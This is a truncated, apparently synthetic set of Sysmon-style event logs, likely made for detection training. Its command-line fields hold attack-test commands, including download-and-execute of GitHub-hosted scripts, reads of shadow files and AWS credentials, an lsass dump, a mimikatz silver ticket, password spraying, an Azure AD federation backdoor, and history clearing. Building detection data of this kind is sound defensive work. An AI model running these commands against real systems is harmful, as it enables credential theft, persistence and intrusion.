    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-81.vargas-craig.net",
        "User": "rebeccabrown",
        "ProcessID": 1800,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"sudo touch /Library/StartupItems/EvilStartup.plist\\n\",",
        "LogonID": 834407,
        "LogonGuid": "b4bdb45c-6a5d-4ca8-917b-7e4c2d4aa9e1",
        "SourceProcessID": 6913,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\network..exe",
        "DestinationProcessID": 7198,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\fear..dll",
        "UtcTime": "2024-05-17T01:36:51.654074Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-42.cobb.com",
        "User": "bhenry",
        "ProcessID": 6020,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"osascript -e \\\"do shell script \\\\\\\"echo \\\\\\\\\\\\\\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\\\\\\\\\\\\\" | python &\\\\\\\"\\\"\\n\",",
        "LogonID": 982495,
        "LogonGuid": "fb3f42f3-b903-4633-a36b-b31d2b343c21",
        "SourceProcessID": 4387,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\culture..dll",
        "DestinationProcessID": 7077,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\far..dll",
        "UtcTime": "2024-05-17T01:36:51.654074Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-67.cruz.net",
        "User": "johnsmith",
        "ProcessID": 7265,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nsensitivefiles -noninteractive -consoleoutput\",",
        "LogonID": 431641,
        "LogonGuid": "75b2f79c-19cb-44f6-994f-24c199913a26",
        "SourceProcessID": 3539,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\receive..exe",
        "DestinationProcessID": 9085,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\religious..dll",
        "UtcTime": "2024-05-17T01:36:51.654074Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-70.price.com",
        "User": "oparker",
        "ProcessID": 3660,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"TEST=$(echo $HISTFILESIZE)\\necho $HISTFILESIZE\\nexport HISTFILESIZE=0\\nif [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \\\"\\\\$HISTFILESIZE is zero\\\"; fi\\n# -> $HISTFILESIZE is zero\\n\",",
        "LogonID": 404300,
        "LogonGuid": "a1008a6e-7cc7-4242-a613-6ef60da8715b",
        "SourceProcessID": 1153,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\thought..dll",
        "DestinationProcessID": 5200,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\rich..dll",
        "UtcTime": "2024-05-17T01:36:51.655071Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-87.owens.com",
        "User": "whitescott",
        "ProcessID": 6308,
        "ProcessName": "malware.exe",
        "CommandLine": "\"for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex \\\"\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy%a\\\\Windows\\\\System32\\\\config\\\\#{target_hive}\\\" %temp%\\\\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\\\\#{target_hive}vss*\\n\",",
        "LogonID": 583264,
        "LogonGuid": "b3bbfd1f-4ef9-4a78-80fb-45e66b5cbb67",
        "SourceProcessID": 2264,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\exist..dll",
        "DestinationProcessID": 6845,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\speak..dll",
        "UtcTime": "2024-05-17T01:36:51.655071Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-64.gordon.biz",
        "User": "lesliehammond",
        "ProcessID": 7330,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"unamestr=$(uname)\\nif [ \\\"$unamestr\\\" = 'Linux' ]; then echo -e \\\"e /etc/passwd\\\\n,p\\\\ne /etc/shadow\\\\n,p\\\\n\\\" | ed > ${output_file}; elif [ \\\"$unamestr\\\" = 'FreeBSD' ]; then echo -e \\\"e /etc/passwd\\\\n,p\\\\ne /etc/master.passwd\\\\n,p\\\\ne /etc/shadow\\\\n,p\\\\n\\\" | ed > ${output_file}; fi\\n\",",
        "LogonID": 639701,
        "LogonGuid": "f975c73e-429e-43a8-aa42-b424b42022cf",
        "SourceProcessID": 5566,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\follow..exe",
        "DestinationProcessID": 1194,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\board..exe",
        "UtcTime": "2024-05-17T01:36:51.655071Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-71.odom-goodwin.info",
        "User": "ylee",
        "ProcessID": 6778,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"find #{file_path} -name \\\"credentials\\\" -type f -path \\\"*/.aws/*\\\" 2>/dev/null\\n\",",
        "LogonID": 976432,
        "LogonGuid": "69b4442e-e5b7-4e5e-8ed4-6afe801b46c4",
        "SourceProcessID": 6864,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\property..exe",
        "DestinationProcessID": 4130,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\step..exe",
        "UtcTime": "2024-05-17T01:36:51.655071Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-15.griffin.com",
        "User": "justin07",
        "ProcessID": 5629,
        "ProcessName": "malware.exe",
        "CommandLine": "\"del %TEMP%\\\\redcanary.cab >nul 2>&1\\n#{Path_replace} #{replace_cab} %TEMP% /A\\n\",",
        "LogonID": 213200,
        "LogonGuid": "87f1dd05-3bc1-4ded-9bae-df2ed882d5ef",
        "SourceProcessID": 1642,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\garden..exe",
        "DestinationProcessID": 4496,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\thought..exe",
        "UtcTime": "2024-05-17T01:36:51.655071Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-98.brandt-watson.com",
        "User": "lawrenceedwards",
        "ProcessID": 3944,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Set-ItemProperty HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force\",",
        "LogonID": 776414,
        "LogonGuid": "d3838976-1198-488d-8d12-b2cfec61e82d",
        "SourceProcessID": 4243,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\financial..dll",
        "DestinationProcessID": 2495,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\region..exe",
        "UtcTime": "2024-05-17T01:36:51.656096Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-33.herrera-mueller.com",
        "User": "lisa36",
        "ProcessID": 6567,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Import-Module AzureAD\\nImport-Module AADInternals\\n\\n$PWord = ConvertTo-SecureString -String \\\"#{azure_password}\\\" -AsPlainText -Force\\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{azure_username}\\\", $Pword\\n\\ntry {\\n  Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null\\n}\\ncatch {\\n  Write-Host \\\"Error: AzureAD could not connect\\\"\\n  exit 1\\n}\\n\\ntry {\\n  $domain = Get-AzureADDomain -Name \\\"#{domain_name}\\\"\\n}\\ncatch {\\n  Write-Host \\\"Error: domain \\\"\\\"#{domain_name}\\\"\\\" not found\\\"\\n  exit 1\\n}\\nif (-Not $domain.IsVerified) {\\n  Write-Host \\\"Error: domain \\\"\\\"#{domain_name}\\\"\\\" not verified\\\"\\n  exit 1\\n}\\n\\nif ($domain.AuthenticationType -eq \\\"Federated\\\") {\\n  Write-Host \\\"Error: domain \\\"\\\"#{domain_name}\\\"\\\" already federated. Try with a different domain or re-create it before.\\\"\\n  exit 1\\n}\\n\\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\\nif (-Not $at) {\\n  Write-Host \\\"Error: AADInternals could not connect\\\"\\n  exit 1\\n}\\n\\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \\\"#{domain_name}\\\"\\nif ($new) {\\n  Write-Host \\\"Federation successfully added to Azure AD\\\"\\n  Write-Host $new\\n}\\nelse {\\n  Write-Host \\\"The federation setup failed\\\"\\n}\\n\\nWrite-Host \\\"End of federation configuration.\\\"\\n\",",
        "LogonID": 532552,
        "LogonGuid": "e144deed-88c3-40a4-b6c4-20770137cb72",
        "SourceProcessID": 6532,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\behind..exe",
        "DestinationProcessID": 6476,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\rest..exe",
        "UtcTime": "2024-05-17T01:36:51.656096Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-52.brock.com",
        "User": "gowen",
        "ProcessID": 1895,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"icacls.exe #{file_or_folder} /grant #{user_or_group}:F\\n\",",
        "LogonID": 330068,
        "LogonGuid": "b96c3e8f-1f7c-4584-9296-929be1243a5a",
        "SourceProcessID": 7644,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\without..exe",
        "DestinationProcessID": 6186,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\garden..dll",
        "UtcTime": "2024-05-17T01:36:51.656096Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-36.ramirez.com",
        "User": "victorwashington",
        "ProcessID": 1101,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"which_python=`which python || which python3`\\n$which_python -c \\\"import bz2;input_file=open('#{path_to_input_file}','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('#{path_to_output_file}','w+');output_file.write(str(bz2content));output_file.close();\\\"\\n\",",
        "LogonID": 598085,
        "LogonGuid": "085c936d-28b1-4a3c-98d2-7dc2619caa16",
        "SourceProcessID": 1083,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\light..exe",
        "DestinationProcessID": 2622,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\they..exe",
        "UtcTime": "2024-05-17T01:36:51.656096Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-91.mora.org",
        "User": "floresbrian",
        "ProcessID": 4490,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"if [ \\\"$(uname)\\\" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;\\n\",",
        "LogonID": 556925,
        "LogonGuid": "bc5c13f7-d29c-4e7a-a945-27da8537d043",
        "SourceProcessID": 6070,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\eat..exe",
        "DestinationProcessID": 6013,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\social..dll",
        "UtcTime": "2024-05-17T01:36:51.656096Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-34.shaffer.com",
        "User": "tbailey",
        "ProcessID": 2849,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"Set-ItemProperty \\\"HKLM:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\\\\" \\\"Shell\\\" \\\"explorer.exe, #{binary_to_execute}\\\" -Force\\n\",",
        "LogonID": 375833,
        "LogonGuid": "a987f16a-9a29-4a84-9c60-ce4345cf9b5c",
        "SourceProcessID": 1948,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\easy..exe",
        "DestinationProcessID": 7314,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\business..dll",
        "UtcTime": "2024-05-17T01:36:51.657099Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-60.patterson.com",
        "User": "julie98",
        "ProcessID": 2305,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"set +o history\\necho 'set +o history' >> ~/.bashrc\\n. ~/.bashrc\\nhistory -c\\n\",",
        "LogonID": 310291,
        "LogonGuid": "a8215b11-e874-45d9-95a9-a5774723ba6a",
        "SourceProcessID": 9402,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\part..exe",
        "DestinationProcessID": 4279,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\include..dll",
        "UtcTime": "2024-05-17T01:36:51.657099Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-80.guerra.com",
        "User": "angie74",
        "ProcessID": 8673,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"findstr /si pass *.xml *.doc *.txt *.xls\\nls -R | select-string -ErrorAction SilentlyContinue -Pattern password\\n\",",
        "LogonID": 851142,
        "LogonGuid": "f8b09531-6857-44a4-b95f-65cce11dec0d",
        "SourceProcessID": 3324,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\open..dll",
        "DestinationProcessID": 9226,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\rise..exe",
        "UtcTime": "2024-05-17T01:36:51.657099Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-59.jones.com",
        "User": "daniel53",
        "ProcessID": 6157,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"\\\"#{uacme_exe}\\\"\\n\",",
        "LogonID": 550705,
        "LogonGuid": "c09babb3-1099-4399-84c0-431c15ff5651",
        "SourceProcessID": 7626,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\stop..dll",
        "DestinationProcessID": 3043,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\particular..exe",
        "UtcTime": "2024-05-17T01:36:51.657099Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-88.hurst.info",
        "User": "denisedavis",
        "ProcessID": 3134,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"tasklist\\n\",",
        "LogonID": 910819,
        "LogonGuid": "e9061f02-f7e4-4b0e-8fc2-8e4d3c6ac109",
        "SourceProcessID": 5640,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\serious..exe",
        "DestinationProcessID": 1674,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\point..dll",
        "UtcTime": "2024-05-17T01:36:51.657099Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-22.schultz.com",
        "User": "heidi60",
        "ProcessID": 7433,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"if (systemd-detect-virt) then echo \\\"Virtualization Environment detected\\\"; fi;\\nif (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \\\"Virtualization Environment detected\\\"; fi;\\n\",",
        "LogonID": 482087,
        "LogonGuid": "0f613a00-27a3-43ec-b368-eb21f45c8c76",
        "SourceProcessID": 7796,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\view..dll",
        "DestinationProcessID": 9064,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\box..exe",
        "UtcTime": "2024-05-17T01:36:51.658097Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-56.martin.biz",
        "User": "fordtony",
        "ProcessID": 1386,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"reg add HKEY_CURRENT_USER\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 370591,
        "LogonGuid": "2f8086d6-0aee-4669-b889-a7d86c0fba9d",
        "SourceProcessID": 8106,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\deep..dll",
        "DestinationProcessID": 3123,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\top..dll",
        "UtcTime": "2024-05-17T01:36:51.658097Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-24.roth-weaver.com",
        "User": "econley",
        "ProcessID": 2818,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"import-module \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\MSOLSpray.ps1\\\"\\nInvoke-MSOLSpray -UserList \\\"#{user_list}\\\" -Password \\\"#{password}\\\"\\n\",",
        "LogonID": 866585,
        "LogonGuid": "b3024474-93cc-4f72-be28-7d757f3f9af1",
        "SourceProcessID": 8856,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\foreign..exe",
        "DestinationProcessID": 6252,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\beyond..dll",
        "UtcTime": "2024-05-17T01:36:51.658097Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-89.walsh.biz",
        "User": "ericjackson",
        "ProcessID": 6463,
        "ProcessName": "malware.exe",
        "CommandLine": "\"\\\"#{procdump_exe}\\\" -accepteula -ma lsass.exe #{output_file}\\n\",",
        "LogonID": 129754,
        "LogonGuid": "c576ae17-cc8c-4cad-a8cf-3f48b93317f1",
        "SourceProcessID": 6572,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\six..exe",
        "DestinationProcessID": 4044,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\window..dll",
        "UtcTime": "2024-05-17T01:36:51.658097Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-97.james.info",
        "User": "christinamartinez",
        "ProcessID": 6517,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"& \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\Backstab64.exe\\\" -k -n #{process_name}\\n\",",
        "LogonID": 485332,
        "LogonGuid": "2a87138b-02bb-42c1-844f-29da0c4161f8",
        "SourceProcessID": 1458,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\professional..dll",
        "DestinationProcessID": 2032,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\figure..dll",
        "UtcTime": "2024-05-17T01:36:51.658097Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-00.fuller-roberts.org",
        "User": "alyssaburke",
        "ProcessID": 8952,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"reg query HKCU\\\\Software\\\\SimonTatham\\\\PuTTY\\\\Sessions /t REG_SZ /s\\n\",",
        "LogonID": 522193,
        "LogonGuid": "003c6a6d-b75b-4873-a5b3-7e0ae3e42b44",
        "SourceProcessID": 2968,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\civil..dll",
        "DestinationProcessID": 3270,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\family..exe",
        "UtcTime": "2024-05-17T01:36:51.659095Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-30.cox-davenport.biz",
        "User": "russellashley",
        "ProcessID": 6054,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"$RunOnceKey = \\\"#{reg_key_path}\\\"\\nset-itemproperty $RunOnceKey \\\"NextRun\\\" '#{thing_to_execute} \\\"IEX (New-Object Net.WebClient).DownloadString(`\\\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\\\")\\\"'\\n\",",
        "LogonID": 804629,
        "LogonGuid": "657051b5-36fa-4c45-b55d-795c915bf791",
        "SourceProcessID": 1335,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\hour..exe",
        "DestinationProcessID": 5205,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\who..exe",
        "UtcTime": "2024-05-17T01:36:51.659095Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-78.gordon-williams.biz",
        "User": "flowersjason",
        "ProcessID": 6543,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;\\nsudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}\\nsudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}\\n\",",
        "LogonID": 710694,
        "LogonGuid": "200a743e-cd6c-48c6-95e6-3f10f6487fe1",
        "SourceProcessID": 9956,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\check..exe",
        "DestinationProcessID": 4844,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\relationship..exe",
        "UtcTime": "2024-05-17T01:36:51.659095Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-84.quinn.com",
        "User": "stonesuzanne",
        "ProcessID": 2868,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"cp #{calc_plist_path} ~/Library/Preferences/ByHost/com.apple.loginwindow.plist\\n\",",
        "LogonID": 248636,
        "LogonGuid": "cebc06b4-a628-473f-9af7-9216ac47b492",
        "SourceProcessID": 7781,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\down..dll",
        "DestinationProcessID": 4269,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\same..exe",
        "UtcTime": "2024-05-17T01:36:51.659095Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-97.evans.biz",
        "User": "vlewis",
        "ProcessID": 3165,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"tasklist.exe\\nsc query\\nsc query state= all\\n\",",
        "LogonID": 418481,
        "LogonGuid": "38484cca-5d8e-4389-9b1c-070273d22eb7",
        "SourceProcessID": 3112,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\see..exe",
        "DestinationProcessID": 3115,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\arrive..dll",
        "UtcTime": "2024-05-17T01:36:51.659095Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-75.cortez-austin.net",
        "User": "wattssally",
        "ProcessID": 9681,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}\",",
        "LogonID": 864852,
        "LogonGuid": "d16a8ca7-e578-48d2-aca9-ec555c8cb214",
        "SourceProcessID": 7543,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\firm..exe",
        "DestinationProcessID": 7466,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\example..dll",
        "UtcTime": "2024-05-17T01:36:51.660100Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-58.price.org",
        "User": "robert44",
        "ProcessID": 3874,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"sudo spctl --master-disable\\n\",",
        "LogonID": 433907,
        "LogonGuid": "3b2f6ee3-cae1-4802-917f-25ba71bae12a",
        "SourceProcessID": 4317,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\above..dll",
        "DestinationProcessID": 1623,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\cause..exe",
        "UtcTime": "2024-05-17T01:36:51.660100Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-28.barnes.com",
        "User": "daniel74",
        "ProcessID": 6027,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"secedit /import /db #{secedit_db} /cfg \\\"#{ini_file}\\\"\\nsecedit /configure /db #{secedit_db}\\n\",",
        "LogonID": 739070,
        "LogonGuid": "96226f3a-9054-4d73-8558-6670cf9e9152",
        "SourceProcessID": 9670,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\upon..dll",
        "DestinationProcessID": 4727,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\ever..exe",
        "UtcTime": "2024-05-17T01:36:51.660100Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-56.santos-adams.info",
        "User": "bailey76",
        "ProcessID": 7503,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"touch #{file_to_setuid}\\nchown root #{file_to_setuid}\\nchmod g+xs #{file_to_setuid}\\n\",",
        "LogonID": 783974,
        "LogonGuid": "f328e4a3-d84d-40a5-9a6c-801750a6a7eb",
        "SourceProcessID": 4415,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\word..exe",
        "DestinationProcessID": 8118,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\station..dll",
        "UtcTime": "2024-05-17T01:36:51.660100Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-26.maddox.org",
        "User": "scooper",
        "ProcessID": 5918,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"Remove-Item $env:TEMP\\\\silver.bat -ErrorAction Ignore\\nRemove-Item $env:TEMP\\\\silver.txt -ErrorAction Ignore\\n\\n# get current domain SID if default was used\\n$domain_sid = \\\"#{domain_sid}\\\"\\nIf ($domain_sid -Match \\\"DEFAULT\\\") {\\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\\n}\\n\\n# create batch file with commands to run in a separate \\\"runas /netonly\\\" session\\n# so we don't purge Kerberos ticket from the current Windows session\\n# its output goes to silver.txt temp file, because we cannot capture \\\"runas /netonly\\\" output otherwise\\n@\\\"\\n>%TEMP%\\\\silver.txt 2>&1 (\\n  echo Purge existing tickets and create silver ticket:\\n  klist purge\\n  #{mimikatz_path} \\\"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{service_aes256_key} /user:#{account} /service:HOST /target:#{target}.#{domain} /ptt\\\" \\\"exit\\\"\\n\\n  echo.\\n  echo executing:schtasks /query /S #{target}.#{domain}\\n  schtasks /query /S #{target}.#{domain}\\n  \\n  echo.\\n  echo Tickets after requesting schtasks:\\n  klist\\n\\n  echo.\\n  echo End of Silver Ticket attack\\n)\\n\\\"@ -Replace \\\"DOMAIN_SID\\\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\\\silver.bat\\n\\n# run batch file in a new empty session (password and username do not matter)\\necho 